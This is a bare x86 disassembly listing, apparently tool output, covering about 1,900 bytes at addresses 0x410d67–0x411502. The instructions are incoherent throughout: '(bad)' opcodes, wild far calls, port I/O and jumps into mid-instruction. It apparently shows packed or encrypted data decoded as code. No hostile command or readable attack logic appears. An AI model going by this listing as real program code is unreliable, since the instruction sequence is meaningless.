  410d67:	mov    dl,0x92
  410d69:	push   ebx
  410d6a:	xlat   BYTE PTR gs:[ebx]
  410d6c:	retf   0xc10b
  410d6f:	jnp    0x410def
  410d71:	mov    ah,0x7f
  410d73:	mov    ebp,0x479a2918
  410d78:	pop    edx
  410d79:	mov    al,0x2
  410d7b:	fs ins BYTE PTR es:[edi],dx
  410d7d:	mov    ecx,DWORD PTR [esi]
  410d7f:	aas    
  410d80:	std    
  410d81:	or     ebp,DWORD PTR [eax-0x7a]
  410d84:	dec    ebx
  410d85:	xor    ebx,DWORD PTR [ebx+0x10]
  410d88:	fmul   QWORD PTR [edx-0x5e]
  410d8b:	xchg   DWORD PTR [ebx-0x74],ebx
  410d8e:	dec    esp
  410d8f:	sub    eax,0xe3ea22e5
  410d94:	push   eax
  410d95:	cli    
  410d96:	mov    dl,0xa7
  410d98:	jmp    0x410d50
  410d9a:	sbb    cl,dl
  410d9c:	xchg   esi,ebp
  410d9e:	jae    0x410d4b
  410da0:	mov    dl,0x62
  410da2:	loop   0x410ddb
  410da4:	mov    bl,0x53
  410da6:	and    eax,0x8b09a2c0
  410dab:	int    0x5a
  410dad:	xchg   DWORD PTR [edx+0x3c],edx
  410db0:	push   edx
  410db1:	adc    ebx,0x6b62b0d0
  410db7:	(bad)  
  410db9:	call   0x5eac7396
  410dbe:	call   0xb227:0x2272d24c
  410dc5:	jge    0x410d51
  410dc7:	retf   0x7704
  410dca:	dec    ecx
  410dcb:	xor    al,BYTE PTR [ebx-0x7db794f4]
  410dd1:	xor    edi,esi
  410dd3:	daa    
  410dd4:	rcl    BYTE PTR [esi],1
  410dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dd7:	xor    DWORD PTR [edx+0x437ba7a],0x79
  410dde:	or     BYTE PTR [ecx-0x3e7fe90a],bh
  410de4:	aad    0xcb
  410de6:	jnp    0x410dfd
  410de8:	std    
  410de9:	xor    ch,0xa4
  410dec:	mov    ecx,0x96e18f4e
  410df1:	ficomp WORD PTR [edx]
  410df3:	dec    ecx
  410df4:	push   0x62
  410df6:	push   ecx
  410df7:	pusha  
  410df8:	mov    dl,0x3
  410dfa:	or     eax,0xc606ae56
  410dff:	and    eax,0x264a0b14
  410e04:	in     al,0x35
  410e06:	add    DWORD PTR [eax],edi
  410e08:	inc    edi
  410e09:	xchg   esi,eax
  410e0a:	jmp    0x410e03
  410e0c:	mov    dl,0xaf
  410e0e:	clc    
  410e0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e10:	addr16 mov eax,ds:0x1c6
  410e14:	and    DWORD PTR [ebx],ecx
  410e16:	xlat   BYTE PTR ds:[ebx]
  410e17:	pop    es
  410e18:	fs mov bh,0xda
  410e1b:	lahf   
  410e1c:	in     al,dx
  410e1d:	mov    dl,0x9a
  410e1f:	stos   BYTE PTR es:[edi],al
  410e20:	add    ch,BYTE PTR [ebp+0x74]
  410e23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e24:	inc    esi
  410e25:	inc    edi
  410e26:	fldpi  
  410e28:	sub    ebp,DWORD PTR [edx+ebx*4-0x6b]
  410e2c:	dec    ecx
  410e2d:	pop    esp
  410e2e:	mov    al,ds:0xe4f6bc88
  410e33:	jecxz  0x410dee
  410e35:	jp     0x410dc7
  410e37:	jb     0x410e43
  410e39:	or     al,0xa4
  410e3b:	jmp    0x7952:0xef2cabd3
  410e42:	sti    
  410e43:	test   eax,0xa51a6419
  410e48:	mov    ebp,0x7962daa7
  410e4d:	jg     0x410e50
  410e4f:	mov    esp,0xb79ad9c6
  410e54:	loope  0x410eb0
  410e56:	scas   al,BYTE PTR es:[edi]
  410e57:	mov    esi,0x59e8dd9f
  410e5c:	imul   ecx,DWORD PTR [esi+edx*1],0xffffff95
  410e60:	and    eax,0x662763fd
  410e65:	inc    eax
  410e66:	mov    ecx,0x57aeb19d
  410e6b:	sbb    BYTE PTR [esi-0x3ac80a62],ah
  410e71:	icebp  
  410e72:	push   ecx
  410e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e74:	in     al,0x2f
  410e76:	inc    ebp
  410e77:	mov    eax,0x712f8e86
  410e7c:	mov    dl,0x20
  410e7e:	jg     0x410e09
  410e80:	push   edx
  410e81:	mov    cl,0x4a
  410e83:	sub    bl,BYTE PTR [edx]
  410e85:	sbb    eax,0xb3551ef
  410e8a:	sbb    dl,bh
  410e8c:	rcl    DWORD PTR [edi+0x16b792fc],1
  410e92:	shl    DWORD PTR [edi-0xae6d555],0xcf
  410e99:	mov    bl,0x78
  410e9b:	inc    esi
  410e9c:	jae    0x410ea9
  410e9e:	sbb    BYTE PTR ds:0xcd89f347,ch
  410ea4:	test   eax,0xd6b79ab9
  410ea9:	sub    bh,BYTE PTR [edi+0x7]
  410eac:	fild   QWORD PTR [ecx+0x6d]
  410eaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410eb0:	sti    
  410eb1:	xchg   edx,eax
  410eb2:	add    ch,BYTE PTR [ebp+0x29329653]
  410eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410eb9:	mov    ah,0x9a
  410ebb:	or     al,0x61
  410ebd:	push   0x33666ce0
  410ec2:	ins    DWORD PTR es:[edi],dx
  410ec3:	mov    ds:0x34b7803e,eax
  410ec8:	xor    cl,dh
  410eca:	mov    bl,0x24
  410ecc:	add    DWORD PTR [edx],ebp
  410ece:	xor    DWORD PTR [edx-0x3c5252e6],ebp
  410ed4:	mov    dl,0x45
  410ed6:	push   esi
  410ed7:	cli    
  410ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ed9:	stos   BYTE PTR es:[edi],al
  410eda:	daa    
  410edb:	mov    eax,0xdfd60b29
  410ee0:	and    edx,ebp
  410ee2:	sub    al,0x5e
  410ee4:	je     0x410e82
  410ee6:	rcl    BYTE PTR [ecx+0x7db80b6c],cl
  410eec:	cmp    al,BYTE PTR [ebx]
  410eee:	cmp    DWORD PTR [esi],0xcd2ccb7b
  410ef4:	add    al,0xbe
  410ef6:	cwde   
  410ef7:	cmp    al,0xae
  410ef9:	push   ebx
  410efa:	call   eax
  410efc:	or     DWORD PTR [ebx],ecx
  410efe:	popf   
  410eff:	mov    eax,ds:0x35fba48c
  410f04:	push   esp
  410f05:	or     esi,DWORD PTR [eax+0x2a]
  410f08:	dec    esp
  410f09:	repnz shr bl,cl
  410f0c:	jbe    0x410eee
  410f0e:	ror    ch,cl
  410f10:	dec    ebp
  410f11:	or     al,0x13
  410f13:	fisttp QWORD PTR [edx+0x3c0ca68]
  410f19:	cs in  eax,0xa7
  410f1c:	jecxz  0x410ee7
  410f1e:	addr16 es js 0x410f6e
  410f22:	dec    edx
  410f23:	dec    edi
  410f24:	mov    dl,0x6f
  410f26:	sub    al,0x9f
  410f28:	mov    al,0xc7
  410f2a:	dec    ebx
  410f2b:	mov    ah,al
  410f2d:	sbb    DWORD PTR ds:0xc216a2c1,esi
  410f33:	loopne 0x410f8d
  410f35:	call   0x37bd0652
  410f3a:	int3   
  410f3b:	xchg   esi,eax
  410f3c:	mov    ch,0x1
  410f3e:	sub    DWORD PTR [esi-0x589c70ec],ebp
  410f44:	pop    edx
  410f45:	out    dx,eax
  410f46:	xor    BYTE PTR [ecx+esi*4+0xb],0x70
  410f4b:	sub    al,0xbf
  410f4d:	outs   dx,DWORD PTR ds:[esi]
  410f4e:	xchg   ecx,eax
  410f4f:	jo     0x410eec
  410f51:	push   cs
  410f52:	cdq    
  410f53:	add    ecx,eax
  410f55:	sahf   
  410f56:	pop    ecx
  410f57:	popf   
  410f58:	dec    edi
  410f59:	retf   
  410f5a:	int    0xe5
  410f5c:	dec    ebp
  410f5d:	or     edx,DWORD PTR [ebx+0xb]
  410f60:	add    BYTE PTR [edx],ch
  410f62:	dec    edi
  410f63:	bound  ebp,QWORD PTR [ebx]
  410f65:	loopne 0x410f01
  410f67:	xchg   esi,eax
  410f68:	aas    
  410f69:	lods   eax,DWORD PTR ds:[esi]
  410f6a:	nop
  410f6b:	and    eax,ebp
  410f6d:	xlat   BYTE PTR ds:[ebx]
  410f6e:	inc    ebp
  410f6f:	out    dx,eax
  410f70:	add    DWORD PTR [esi],esi
  410f72:	call   0x8e07:0x22a1651
  410f79:	xor    al,0xa2
  410f7b:	(bad)  
  410f7c:	fiadd  DWORD PTR [ebp-0x54214bbd]
  410f82:	aaa    
  410f83:	test   al,0x86
  410f85:	inc    eax
  410f86:	loopne 0x410fe5
  410f88:	or     ebp,DWORD PTR gs:[eax]
  410f8b:	test   BYTE PTR [edx+0x6b],dh
  410f8e:	add    DWORD PTR [ebx],eax
  410f90:	inc    ebx
  410f91:	sub    al,0x9a
  410f93:	add    BYTE PTR [esi],bl
  410f95:	mulps  xmm1,XMMWORD PTR [edi-0x5cb7bdfc]
  410f9c:	lahf   
  410f9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f9e:	mov    eax,0x328b3039
  410fa3:	enter  0xc1eb,0x9a
  410fa7:	pushf  
  410fa8:	xchg   esi,eax
  410fa9:	imul   edi,DWORD PTR [edi],0xffffffe5
  410fac:	mov    ebp,0x54a7862c
  410fb1:	inc    ebx
  410fb2:	xor    ecx,DWORD PTR [edx]
  410fb4:	bound  ebx,QWORD PTR [eax]
  410fb6:	sub    al,0x2d
  410fb8:	mov    dl,0x1f
  410fba:	jle    0x411009
  410fbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fbd:	mov    al,ds:0xb35995a
  410fc2:	mov    ds:0x440a9821,eax
  410fc7:	int3   
  410fc8:	rcl    DWORD PTR [edx-0x7c],1
  410fcb:	dec    edx
  410fcc:	push   DWORD PTR [edi+eax*1-0x554dc411]
  410fd3:	ffreep st(4)
  410fd5:	pop    ss
  410fd6:	xchg   esi,eax
  410fd7:	mov    ecx,0xe0911532
  410fdc:	pop    edx
  410fdd:	pop    esp
  410fde:	imul   edx,DWORD PTR [edi],0x5f
  410fe1:	imul   edx,DWORD PTR [edx-0x35],0xffffffc5
  410fe5:	std    
  410fe6:	call   0x1947:0xd441208b
  410fed:	outs   dx,BYTE PTR ds:[esi]
  410fee:	pop    ebp
  410fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ff0:	mov    BYTE PTR [edi],dl
  410ff2:	aas    
  410ff3:	dec    ecx
  410ff4:	mov    cs,WORD PTR [edi+0x62]
  410ff7:	in     al,dx
  410ff8:	mov    dl,0x1a
  410ffa:	std    
  410ffb:	lock rol DWORD PTR [ecx+0xa6b21cf],0x31
  411003:	popf   
  411004:	test   BYTE PTR [edi],al
  411006:	mov    ebx,0xd5c326e3
  41100b:	push   edx
  41100c:	mov    bl,0xd3
  41100e:	add    dh,BYTE PTR [edx+0x6c]
  411011:	lds    ebp,FWORD PTR ds:0x3cc14e02
  411017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411018:	int3   
  411019:	adc    BYTE PTR [edi-0x500cfe51],0x70
  411020:	mov    dl,0x33
  411022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411023:	arpl   WORD PTR [esi+ebp*8],cx
  411026:	hlt    
  411027:	inc    eax
  411028:	retf   0xe0b
  41102b:	jne    0x411095
  41102d:	pop    es
  41102e:	jne    0x411099
  411030:	dec    sp
  411032:	add    ah,BYTE PTR [esi+0x49c59b9a]
  411038:	mov    dl,0x70
  41103a:	sbb    al,0x2
  41103c:	pushf  
  41103d:	xor    DWORD PTR [esi+0x3a],esp
  411040:	je     0x41104d
  411042:	mov    eax,ds:0xdc92e30b
  411047:	dec    esp
  411048:	repz fistp DWORD PTR [edx+0x741a0140]
  41104f:	sar    bl,1
  411051:	call   0xe566:0x90a0a793
  411058:	ds push esp
  41105a:	ds xchg edx,eax
  41105c:	mov    dl,0xc6
  41105e:	xchg   edx,eax
  41105f:	sub    eax,0xacd74c6f
  411064:	imul   ecx,DWORD PTR [ebx],0x6
  411067:	xchg   ah,dh
  411069:	pop    esi
  41106a:	stos   DWORD PTR es:[edi],eax
  41106b:	xchg   ebx,eax
  41106c:	jp     0x411039
  41106e:	call   0xd835:0x7040fb5b
  411075:	push   ds
  411076:	push   esi
  411077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411078:	fld    QWORD PTR [ecx]
  41107a:	adc    eax,0x7f9adbaf
  41107f:	(bad)  
  411080:	mov    dl,0x12
  411082:	dec    esi
  411083:	out    0x32,eax
  411085:	into   
  411086:	mov    ds:0x59714972,eax
  41108b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41108c:	sub    cl,BYTE PTR [eax]
  41108e:	int3   
  41108f:	sub    al,0xf
  411091:	push   0x54b5ace3
  411096:	ret    0xfee8
  411099:	sub    ch,BYTE PTR [edx-0x3e]
  41109c:	pop    ebx
  41109d:	xchg   esp,eax
  41109e:	mov    ah,BYTE PTR [edi-0x65b06adf]
  4110a4:	rcl    BYTE PTR [ecx],1
  4110a6:	test   BYTE PTR [eax-0x4e],al
  4110a9:	push   esp
  4110aa:	pop    ebx
  4110ab:	lods   al,BYTE PTR ds:[esi]
  4110ac:	jnp    0x411056
  4110ae:	or     al,0x1b
  4110b0:	into   
  4110b1:	or     edi,DWORD PTR [edx+0x123012ba]
  4110b7:	mov    DWORD PTR [ebp+0x6c],eax
  4110ba:	call   0x169:0x2b50317c
  4110c1:	mov    esi,0x5c6a646
  4110c6:	stos   DWORD PTR es:[edi],eax
  4110c7:	aas    
  4110c8:	inc    ebx
  4110c9:	pop    ecx
  4110ca:	xchg   edx,eax
  4110cb:	arpl   WORD PTR [ecx-0xb2e6552],ax
  4110d1:	call   FWORD PTR [eax]
  4110d3:	jae    0x411130
  4110d5:	ins    BYTE PTR es:[edi],dx
  4110d6:	and    BYTE PTR [edi+0x677d0086],0xb8
  4110dd:	and    eax,0x87b20bf1
  4110e2:	addr16 in eax,0xca
  4110e5:	shl    DWORD PTR [eax-0x4ff497cf],cl
  4110eb:	inc    ebx
  4110ec:	fimul  WORD PTR [edx+0x6d172384]
  4110f2:	call   0xaf0f:0xdf8e7a
  4110f9:	inc    si
  4110fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110fc:	sbb    eax,0xe1886f6b
  411101:	cmp    eax,DWORD PTR [esi-0x2514d31]
  411107:	fimul  DWORD PTR [ecx-0x790c5985]
  41110d:	jmp    0x4110ae
  41110f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411110:	dec    ebp
  411111:	popf   
  411112:	cmp    ebp,DWORD PTR [esi+esi*1-0x54]
  411116:	aad    0x29
  411118:	mov    dl,0x36
  41111a:	fst    QWORD PTR [esi+0x6e82f5c0]
  411120:	lods   al,BYTE PTR ds:[esi]
  411121:	jg     0x41110a
  411123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411124:	or     BYTE PTR [ebp-0x65],dh
  411127:	and    eax,0xcd981cb8
  41112c:	mov    dl,0xf6
  41112e:	dec    esp
  41112f:	add    BYTE PTR [ebp+eax*8+0xbe4b870],ah
  411136:	jne    0x41110b
  411138:	jnp    0x4111a8
  41113a:	xchg   DWORD PTR [ebx],edx
  41113c:	and    ebx,edx
  41113e:	popf   
  41113f:	pop    ebx
  411140:	or     ecx,DWORD PTR [esi-0x5b]
  411143:	mov    esi,DWORD PTR [edx+0x36]
  411146:	xor    bh,BYTE PTR [ebx-0x5e]
  411149:	or     edi,ecx
  41114b:	ret    
  41114c:	test   DWORD PTR [ecx+0x3],ecx
  41114f:	div    ebp
  411151:	mov    dh,0x9a
  411153:	sbb    DWORD PTR [ecx*1+0x319d39ec],ebx
  41115a:	into   
  41115b:	test   al,0x82
  41115d:	cwde   
  41115e:	js     0x41119c
  411160:	mov    dl,0x94
  411162:	dec    ecx
  411163:	push   esi
  411164:	mov    bl,0x7b
  411166:	mov    BYTE PTR [eax+0x61988af2],ah
  41116c:	fnstenv [edi]
  41116e:	inc    esi
  41116f:	out    0x1c,eax
  411171:	cmp    BYTE PTR ds:0x3a8c51a7,dl
  411177:	jge    0x4111e3
  411179:	add    edx,ebp
  41117b:	sbb    al,0xb2
  41117d:	lods   eax,DWORD PTR ds:[esi]
  41117e:	mov    edx,0x3d9c3489
  411183:	jmp    0x44111a92
  411188:	push   edi
  411189:	ins    DWORD PTR es:[edi],dx
  41118a:	mov    edi,DWORD PTR [edi-0x337b9e8e]
  411190:	mov    dl,0x2b
  411192:	int3   
  411193:	lods   al,BYTE PTR ds:[esi]
  411194:	mov    dh,0x49
  411196:	mov    eax,ds:0xd08f9ea
  41119b:	push   ebp
  41119c:	add    al,0x5f
  41119e:	nop
  41119f:	out    dx,eax
  4111a0:	mov    dl,0xab
  4111a2:	hlt    
  4111a3:	adc    cl,cl
  4111a5:	dec    eax
  4111a6:	loopne 0x41112d
  4111a8:	out    dx,ax
  4111aa:	xchg   BYTE PTR [edi+0x539db89f],ah
  4111b0:	pusha  
  4111b1:	jns    0x411183
  4111b3:	test   BYTE PTR [ebp+0x2260556f],dh
  4111b9:	and    eax,0x8a975afa
  4111be:	jle    0x411167
  4111c0:	rol    DWORD PTR ds:0x76165b1,1
  4111c6:	lahf   
  4111c7:	bound  eax,QWORD PTR [edx+0x7fc3a28e]
  4111cd:	xchg   esp,eax
  4111ce:	adc    eax,0x8fd20ba7
  4111d3:	test   ecx,esp
  4111d5:	(bad)  
  4111d6:	cmp    ebp,esp
  4111d8:	mov    bl,0xd1
  4111da:	push   0x58
  4111dc:	mov    al,0x5
  4111de:	jbe    0x41119a
  4111e0:	outs   dx,BYTE PTR ds:[esi]
  4111e1:	fadd   QWORD PTR [ebx+0x51]
  4111e4:	mov    bh,0xa
  4111e6:	inc    ebp
  4111e7:	out    0x8a,al
  4111e9:	sbb    DWORD PTR [ecx],ebx
  4111eb:	loope  0x4111b9
  4111ed:	repz icebp 
  4111ef:	mov    WORD PTR [edx-0x5c1211f6],?
  4111f5:	xor    BYTE PTR [edi],cl
  4111f7:	jb     0x4111af
  4111f9:	or     esp,DWORD PTR [edx-0x76]
  4111fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111fd:	std    
  4111fe:	mov    dh,0xad
  411200:	loopne 0x411272
  411202:	xchg   esp,eax
  411203:	into   
  411204:	adc    al,0xb1
  411206:	or     BYTE PTR [esi],ah
  411208:	(bad)  
  411209:	loop   0x411233
  41120b:	mov    DWORD PTR [esi-0x32],0x8991a738
  411212:	fwait
  411213:	jno    0x41127a
  411215:	shl    ebx,cl
  411217:	inc    ecx
  411218:	mov    ch,0xef
  41121a:	fisttp WORD PTR [edx+0x7d58469]
  411220:	cmp    al,0x2c
  411223:	sub    dl,BYTE PTR [edi]
  411225:	or     edx,DWORD PTR [ebx-0x39608d3f]
  41122b:	cmp    BYTE PTR [esp+ebp*2-0x65],ch
  41122f:	and    edx,0xffffffe4
  411232:	pop    ds
  411233:	fmul   st(5),st
  411235:	jns    0x4112ad
  411237:	mov    edi,0xa0ae0bf7
  41123c:	xor    al,0x63
  41123e:	add    ecx,DWORD PTR [eax]
  411240:	mov    ebp,0x23f89a7b
  411245:	xor    ah,BYTE PTR [eax-0x3f]
  411248:	sub    al,BYTE PTR ds:0x8a8ea72b
  41124e:	or     DWORD PTR [eax+0x30],0xb39633e9
  411255:	mov    fs,edi
  411257:	xchg   BYTE PTR ds:0x6af768a8,cl
  41125d:	test   eax,0x7920a7d1
  411262:	lahf   
  411263:	shl    DWORD PTR [esi],1
  411265:	push   ds
  411266:	cld    
  411267:	stos   BYTE PTR es:[edi],al
  411268:	scas   eax,DWORD PTR es:[edi]
  411269:	stos   BYTE PTR es:[edi],al
  41126a:	push   esi
  41126b:	sub    BYTE PTR [edx-0x1f],dh
  41126e:	add    al,0x4c
  411270:	push   es
  411271:	xchg   ecx,eax
  411272:	push   0xf60990d0
  411277:	push   ds
  411278:	and    al,0x37
  41127a:	pop    ds
  41127b:	fdiv   DWORD PTR [ebx+0xf]
  41127e:	mov    al,ds:0x9a3b61c7
  411283:	loop   0x4112f8
  411285:	outs   dx,BYTE PTR ds:[esi]
  411286:	test   DWORD PTR [edi],ebp
  411288:	iret   
  411289:	lock in eax,dx
  41128b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41128c:	mov    ds:0x84712a9f,eax
  411291:	sqrtps xmm7,XMMWORD PTR [ebp+ecx*4-0x16]
  411296:	dec    esi
  411297:	mov    ds:0x9914655f,eax
  41129c:	jb     0x411222
  41129e:	enter  0x4917,0xb
  4112a2:	xchg   esp,eax
  4112a3:	xchg   ebp,eax
  4112a4:	in     al,dx
  4112a5:	mov    bh,0x74
  4112a7:	or     edx,esi
  4112a9:	(bad)  
  4112aa:	(bad)  
  4112ab:	and    ebp,DWORD PTR [edx+0x3cbc5b15]
  4112b1:	mov    dl,ah
  4112b3:	inc    edi
  4112b4:	out    0x14,al
  4112b6:	add    ch,BYTE PTR [eax-0x14]
  4112b9:	pop    es
  4112ba:	call   FWORD PTR [ecx]
  4112bc:	adc    DWORD PTR [edx-0x38],0x48
  4112c0:	xbegin 0x97c6b060
  4112c6:	or     ecx,DWORD PTR [edx-0x5825a6b3]
  4112cc:	dec    edi
  4112cd:	aam    0x34
  4112cf:	out    dx,eax
  4112d0:	jns    0x4112d3
  4112d2:	pop    ds
  4112d3:	bnd ret 0xe281
  4112d7:	inc    eax
  4112d8:	dec    edx
  4112d9:	jnp    0x411276
  4112db:	ins    DWORD PTR es:[edi],dx
  4112dc:	push   0x23
  4112de:	mov    eax,ds:0x7a1484a4
  4112e3:	je     0x41134e
  4112e5:	or     ch,BYTE PTR [ebx-0x253c40e7]
  4112eb:	dec    esp
  4112ec:	fdivr  st(2),st
  4112ee:	in     al,0x87
  4112f0:	add    al,0x7c
  4112f2:	call   0xc47d:0x1d18af36
  4112f9:	es cmc 
  4112fb:	test   eax,0x74b9662d
  411300:	shl    BYTE PTR [ebp-0x48],cl
  411303:	add    al,0x1c
  411305:	sub    eax,0x8b86d0a6
  41130a:	daa    
  41130b:	dec    edx
  41130c:	(bad)  
  41130d:	repz mov dh,0xec
  411310:	pop    esp
  411311:	out    0x65,eax
  411313:	pop    ss
  411314:	mov    cl,0x9
  411316:	fldenv [ebp+0x63a83507]
  41131c:	shl    BYTE PTR [ebx+0x27],cl
  41131f:	xor    BYTE PTR [ebp-0x1284c0ed],dh
  411325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411326:	mov    edx,0x55524735
  41132b:	jmp    0x4112ed
  41132d:	out    dx,al
  41132e:	test   DWORD PTR [esp+ebp*4+0x4c],ebx
  411332:	lods   al,BYTE PTR ds:[esi]
  411333:	mov    ebp,0x192b5afb
  411339:	cmp    BYTE PTR [edx-0x66d9635],bl
  41133f:	mov    esi,DWORD PTR ds:0xeea74f69
  411345:	xor    dh,BYTE PTR [edi]
  411347:	stos   BYTE PTR es:[edi],al
  411348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411349:	xchg   ecx,eax
  41134a:	mov    esp,0xaa8eb2ed
  41134f:	bound  edi,QWORD PTR [ebp-0x5c]
  411352:	ins    BYTE PTR es:[edi],dx
  411353:	popa   
  411354:	jae    0x411361
  411356:	shl    ecx,0xd4
  411359:	or     ebp,esp
  41135b:	jg     0x41133a
  41135d:	xchg   ch,ch
  41135f:	nop
  411360:	mov    esp,0xee83b4e1
  411365:	dec    ebx
  411366:	push   cs
  411367:	test   DWORD PTR [ebx+esi*2],esp
  41136a:	in     al,dx
  41136b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41136c:	in     al,0x95
  41136e:	adc    DWORD PTR [ecx+0x5b19b7c9],0xffffffaf
  411375:	(bad)  
  411376:	hlt    
  411377:	inc    edx
  411378:	mov    dl,0x5e
  41137a:	mov    ds,WORD PTR [ebp+0x55]
  41137d:	pop    ebp
  41137e:	push   0xffffffa7
  411380:	sbb    dh,bl
  411382:	fwait
  411383:	in     ax,0xd0
  411386:	cwde   
  411387:	fwait
  411388:	mov    dl,0xd5
  41138a:	inc    ebx
  41138b:	(bad)  
  41138c:	mov    ecx,0xee12b1d
  411391:	add    al,0xfe
  411393:	mov    dh,0xdd
  411395:	sti    
  411396:	call   0xac2f:0xedaf0ba6
  41139d:	test   al,0x1e
  41139f:	scas   al,BYTE PTR es:[edi]
  4113a0:	repnz pop ebp
  4113a2:	les    esp,FWORD PTR [ecx]
  4113a4:	rcr    BYTE PTR [edi],cl
  4113a6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113a8:	xchg   esp,eax
  4113a9:	push   es
  4113aa:	fnstcw WORD PTR [edx+0x6e505fd8]
  4113b0:	inc    esi
  4113b1:	xchg   ebp,eax
  4113b2:	jge    0x41141b
  4113b4:	xchg   edx,eax
  4113b5:	cs jmp 0x1a38d081
  4113bb:	push   0xdfef0b82
  4113c0:	dec    ebp
  4113c1:	clc    
  4113c2:	into   
  4113c3:	cdq    
  4113c4:	push   0xffffffe7
  4113c6:	call   0x7b85:0xff152ef7
  4113cd:	sbb    ebx,DWORD PTR [ecx+0x5c76c7f6]
  4113d3:	call   0xbce:0x6062db54
  4113da:	pop    edi
  4113db:	mov    bl,0xcc
  4113dd:	mov    dl,0xf2
  4113df:	test   DWORD PTR [ecx],0x23019a06
  4113e5:	xchg   bx,ax
  4113e7:	push   esi
  4113e8:	mov    ebp,0xc5bae37f
  4113ed:	nop
  4113ee:	sbb    DWORD PTR [edi],esp
  4113f0:	lea    ebx,[ebx]
  4113f2:	and    DWORD PTR [bp+di-0x652f],ebx
  4113f7:	pop    ebx
  4113f8:	push   0x3f
  4113fa:	imul   esi,eax,0xa7c13575
  411400:	dec    esp
  411401:	inc    esi
  411402:	mov    esp,0xa691fbb5
  411407:	div    DWORD PTR [edx+0x38d6e245]
  41140d:	in     eax,0x51
  41140f:	ret    0xbcb
  411412:	out    dx,al
  411413:	jno    0x4113fb
  411415:	push   ds
  411416:	scas   eax,DWORD PTR es:[edi]
  411417:	into   
  411418:	leave  
  411419:	pop    ds
  41141a:	fwait
  41141b:	sub    BYTE PTR ds:0xd135e504,0xaa
  411422:	dec    eax
  411423:	inc    edi
  411424:	fisubr WORD PTR [esi]
  411426:	adc    esp,DWORD PTR [edi+0x21434e94]
  41142c:	jne    0x411403
  41142e:	xchg   esi,eax
  41142f:	jge    0x4113df
  411431:	push   eax
  411432:	jg     0x4113eb
  411434:	mov    dl,0xeb
  411436:	mov    eax,ds:0xa28199d6
  41143b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41143c:	adc    BYTE PTR [esi+0xa],dh
  41143f:	push   es
  411440:	lock xchg esp,eax
  411442:	fidivr DWORD PTR [ecx-0x4e]
  411445:	jne    0x4113f3
  411447:	push   0xffffffd7
  411449:	jle    0x4113e1
  41144b:	cwde   
  41144c:	push   edx
  41144d:	or     al,BYTE PTR [esi]
  41144f:	test   ch,dl
  411451:	fdivr  QWORD PTR ds:0x2fc39319
  411457:	mov    cl,0xb2
  411459:	jecxz  0x41142f
  41145b:	(bad)  
  41145c:	push   ecx
  41145d:	data16 sub BYTE PTR [esp+edx*2],ch
  411461:	or     edx,DWORD PTR [ebx+ebx*2-0x17]
  411465:	shl    BYTE PTR [edx+0x251f011],0x90
  41146c:	mov    al,0x6f
  41146e:	adc    al,0xde
  411470:	sbb    DWORD PTR [edx],ebx
  411472:	add    eax,0xb49dd9c7
  411477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411478:	push   ebx
  411479:	and    BYTE PTR [edi+0x72],bh
  41147c:	cs pop ss
  41147e:	lock retf 
  411480:	mov    ch,0x23
  411482:	push   esi
  411483:	xor    dl,bh
  411485:	(bad)  [edx+0x1e]
  411488:	(bad)
  41148b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41148c:	sub    BYTE PTR [edx],0x46
  41148f:	and    edx,DWORD PTR [edx]
  411491:	retf   0x5e77
  411494:	mov    ch,0xe7
  411496:	mov    esp,0x68fb8867
  41149b:	shl    BYTE PTR [esi-0x7686f715],1
  4114a1:	or     ch,BYTE PTR [ebp+0x353d9ed2]
  4114a7:	in     eax,0x28
  4114a9:	iret   
  4114aa:	(bad)  
  4114ab:	xchg   ebx,eax
  4114ac:	mov    bl,0x60
  4114ae:	test   DWORD PTR [ebx+0x5c06ec74],edi
  4114b4:	bound  ebp,QWORD PTR [ebx]
  4114b6:	inc    edx
  4114b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114b8:	pop    ebx
  4114b9:	int3   
  4114ba:	repz lock js 0x4114f9
  4114be:	add    bh,BYTE PTR [ebx-0x69]
  4114c1:	mov    al,ds:0xdec95a9a
  4114c6:	in     al,dx
  4114c7:	cmp    eax,0x1a2d74ad
  4114cc:	ret    0x72a9
  4114cf:	out    dx,eax
  4114d0:	mov    dl,0x21
  4114d2:	mov    eax,0x63f764c8
  4114d7:	mov    ebx,0xba28e74d
  4114dc:	int    0xfc
  4114de:	rcr    DWORD PTR [edi],cl
  4114e0:	mov    dl,0x7c
  4114e2:	fild   WORD PTR [edx-0x40e77981]
  4114e8:	mov    dl,0x4c
  4114ea:	adc    DWORD PTR [ebx+0x60],ebp
  4114ed:	shr    DWORD PTR [eax],cl
  4114ef:	pop    es
  4114f0:	add    al,0xbb
  4114f2:	add    DWORD PTR [ebp+0x8],ebx
  4114f5:	push   ss
  4114f6:	rcl    cl,0x79
  4114f9:	dec    ebx
  4114fa:	pop    ebp
  4114fb:	in     al,0xd6
  4114fd:	xchg   ecx,eax
  4114fe:	add    ch,ch
  411500:	out    dx,al
  411501:	push   eax
  411502:	push   esp
